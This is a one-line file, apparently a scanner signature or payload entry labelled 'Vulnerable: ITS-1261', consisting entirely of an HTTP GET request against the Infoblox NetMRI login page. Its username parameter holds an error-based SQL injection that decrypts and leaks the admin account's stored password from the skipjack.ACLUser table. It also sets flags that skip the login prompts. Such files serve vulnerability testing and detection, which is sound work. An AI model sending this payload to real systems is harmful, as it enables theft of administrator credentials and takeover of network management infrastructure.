# Vulnerable: ITS-1261
GET /netmri/config/userAdmin/login.tdf?skipjackUsername=admin%22+AND+updatexml(rand(),concat(CHAR(126),NetmriDecrypt((select%20PasswordSecure%20from%20skipjack.ACLUser%20where%20UserName=%22admin%22),%22password%22,1),CHAR(126)),null)--%22&skipjackPassword=anything&weakPassword=true&eulaAccepted=Accept&mode=DO-LOGIN
